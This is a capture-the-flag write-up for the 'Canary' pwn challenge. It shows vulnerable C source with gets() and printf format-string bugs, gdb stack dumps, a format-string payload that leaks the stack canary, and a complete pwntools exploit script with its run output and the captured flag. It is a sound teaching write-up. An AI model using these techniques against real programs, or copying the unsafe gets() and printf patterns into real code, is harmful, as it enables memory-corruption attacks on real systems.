# Canary
Binary Explotation, 70 points

## Description
> Can you call the flag function in this [program](https://files.actf.co/9614bc019231c2b6301e0cb5405423add02b5d1f041da0d3d35986ef34f50b23/canary) ([source](https://files.actf.co/27f15f75b231a3179ed0e19f79d9ab4cbd058d5460d7de4bf65f1ff00a228315/canary.c))?

```c
#define _GNU_SOURCE

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

void flag() {
	system("/bin/cat flag.txt");
}

void wake() {
	puts("Cock-a-doodle-doo! Cock-a-doodle-doo!\n");
	puts("        .-\"-.");
	puts("       / 4 4 \\");
	puts("       \\_ v _/");
	puts("       //   \\\\");
	puts("      ((     ))");
	puts("=======\"\"===\"\"=======");
	puts("         |||");
	puts("         '|'\n");
	puts("Ahhhh, what a beautiful morning on the farm!");
	puts("And my canary woke me up at 5 AM on the dot!\n");
	puts("       _.-^-._    .--.");
	puts("    .-'   _   '-. |__|");
	puts("   /     |_|     \\|  |");
	puts("  /               \\  |");
	puts(" /|     _____     |\\ |");
	puts("  |    |==|==|    |  |");
	puts("  |    |--|--|    |  |");
	puts("  |    |==|==|    |  |");
	puts("^^^^^^^^^^^^^^^^^^^^^^^^\n");
}

void greet() {
	printf("Hi! What's your name? ");
	char name[20];
	gets(name);
	printf("Nice to meet you, ");
	printf(strcat(name, "!\n"));
	printf("Anything else you want to tell me? ");
	char info[50];
	gets(info);
}

int main() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	gid_t gid = getegid();
	setresgid(gid, gid, gid);
	wake();
	greet();
}

```

Hints:

* That printf call looks dangerous too...

## Solution

The vulnerability is a *buffer overflow* and *format string* in the `greet` function

```c
	gets(name); // --> buffer overflow
	printf("Nice to meet you, ");
	printf(strcat(name, "!\n")); // --> format string
	printf("Anything else you want to tell me? ");
	char info[50];
	gets(info); // --> buffer overflow
```

We have two opportunity's for bof(buffer overflow) but if we will cause a bof on the first time we will overwrite the [canary](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/) and get a stack smashing:

```console
*** stack smashing detected ***: <unknown> terminated
```

so we wont use the first bof, we will use the buffer in order to trigger the format string and leak the canary, after that we can overwrite the canary with itself and jump to the `flag` function.

first we need to get the offset of our buffer:

```console
Hi! What's your name? AAAAAAAA %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
Nice to meet you, AAAAAAAA 0x7ffc221a0fc0 0x38 0xffffffffffffffc6 0x12 0x7f35484b84c0 0x4141414141414141 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0xa21 0x7ffc221a36c0 0x4006a0 0x7ffc221a37c0!
```

I used `AAAAAAAA` because I know the hex for an `A` is 0x41 and it will be easy to track.
If we count the number of values leaked until our `0x4141414141414141` we will get that its 6, nice.

Next we want the value of the canary, We know that the canary is two places after the `saved rip`, so we'll debug the program using gdb and put a breakpoint on the call to `printf`

Pay attention that we want the second call to `printf` which is at `greet+69`
To recognize the buffer we'll put a `AAAAAAAA` in the input
We'll print the stack layout:

```console
gef➤  x/100lx $rsp
0x7fffffffdea0:	0x41414141	0x41414141	0xf7a71400	0x00007fff
0x7fffffffdeb0:	0x00000019	0x00000000	0xf7dd0760	0x00007fff
0x7fffffffdec0:	0x00400c17	0x00000000	0xf7a64b62	0x00007fff
0x7fffffffded0:	0xf7dd0760	0x00007fff	0x00000000	0x00000000
0x7fffffffdee0:	0xffffdf00	0x00007fff	0x004006a0	0x00000000
0x7fffffffdef0:	0xffffe000	0x00007fff	0x30261100	0x799589ad
0x7fffffffdf00:	0xffffdf20	0x00007fff	0x004009c9	0x00000000
0x7fffffffdf10:	0xffffe000	0x00007fff	0x00000000	0x000003e8
0x7fffffffdf20:	0x004009d0	0x00000000	0xf7a05b97	0x00007fff
0x7fffffffdf30:	0x00000001	0x00000000	0xffffe008	0x00007fff
0x7fffffffdf40:	0x00008000	0x00000001	0x00400957	0x00000000
```

We can check the `saved rip` using `info frame`:

```console
gef➤  i frame
Stack level 0, frame at 0x7fffffffdf10:
 rip = 0x4008d6 in greet; saved rip = 0x4009c9
 called by frame at 0x7fffffffdf30
 Arglist at 0x7fffffffdf00, args: 
 Locals at 0x7fffffffdf00, Previous frame's sp is 0x7fffffffdf10
 Saved registers:
  rbp at 0x7fffffffdf00, rip at 0x7fffffffdf08
```
So we check for two places after our saved rip `0x4009c9`, the saved rip is at offset 19.
6 (offset of our buffer) + 13 (values on the stack) = 19

The canry is 2 places after the `saved rip` so offset 17: `0x30261100	0x799589ad`.
We count every 8 bytes because out architecture is amd64

Now we can check the offset of the bof for the second `gets` call and overwrite the canary and the saved rip.
using `cyclic` of `pwntools` we get that the offset is 72.

So our payload will be:

```python
payload = 'A' * (overflow_offset - 16) + p64(leaked_canary) + fake_rbp + p64(ret_gadget) + p64(flag_address)
```

I had a problem with the `movaps` instruction, so in order the allign my payload I added a `ret gadget`.

```python
from pwn import *
import sys

context.clear(arch='amd64', os='linux')

argv = sys.argv
binary_path = './canary'
REMOTE = False
DEBUG = False

if len(argv) > 1:
	if argv[1] == 'remote':
		REMOTE = True
	if argv[1] == 'debug':
		DEBUG = True

if REMOTE:
	sh = remote('shell.actf.co', 20701)
else:
	sh = process([binary_path])

if DEBUG:
	gdb.attach(sh, '''
		b* main
		''')

e = ELF(binary_path)

# ------------- plan -----------
# leak canary using format string
# buffer overflow using canary!
# jump to flag function

sh.sendlineafter("Hi! What's your name? ", '%17$p')
sh.recvuntil('Nice to meet you, ')
leaked_canary = int(sh.recvline()[:-2], 0)
log.info('canary: {}'.format(hex(leaked_canary)))

overflow_offset = 72
flag_address = e.sym['flag']
fake_rbp = 8 * 'B'
ret_gadget = 0x40060e

payload = 'A' * (overflow_offset - 16) + p64(leaked_canary) + fake_rbp + p64(ret_gadget) + p64(flag_address)

sh.sendlineafter('Anything else you want to tell me? ', payload)

print sh.recvall()
```

Output:
```console
yuvaly0@yuvalyo-blup:~/Desktop/CTFs/Canary_DONE$ python exploit.py remote
[+] Opening connection to shell.actf.co on port 20701: Done
[*] '/home/yuvaly0/Desktop/CTFs/Canary_DONE/canary'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] canary: 0x4c0cc112c9921c00
[+] Receiving all data: Done (51B)
[*] Closed connection to shell.actf.co port 20701
actf{youre_a_canary_killer_>:(}
```
